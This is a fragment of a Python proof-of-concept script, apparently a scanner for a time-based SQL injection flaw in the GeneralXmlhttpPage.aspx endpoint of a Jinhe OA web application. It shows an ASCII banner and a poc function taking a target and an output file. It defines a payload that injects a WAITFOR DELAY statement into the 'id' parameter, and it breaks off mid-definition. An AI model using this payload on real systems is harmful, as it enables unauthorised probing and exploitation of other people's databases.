...
def banner():
  ...
  / _ \___ _ __   ___ _ __ __ _| \ \/ /_ __ ___ | | |__ | |_| |_ _ __   / _ \__ _  __ _  ___ 
 / /_\/ _ \ '_ \ / _ \ '__/ _` | |\  /| '_ ` _ \| | '_ \| __| __| '_ \ / /_)/ _` |/ _` |/ _ \
/ /_\\  __/ | | |  __/ | | (_| | |/  \| | | | | | | | | | |_| |_| |_) / ___/ (_| | (_| |  __/
\____/\___|_| |_|\___|_|  \__,_|_/_/\_\_| |_| |_|_|_| |_|\__|\__| .__/\/    \__,_|\__, |\___|
                                                                |_|               |___/      """
    print(test)
...
def poc(target, output_file):
    ...
    # 定义payload
    payload_sleep = "/C6/Jhsoft.Web.appraise/GeneralXmlhttpPage.aspx/?type=CheckAppraiseState&id=1'%3b+WAITFOR%20DELAY%20%270:0:5%27--"
    payload_normal = (
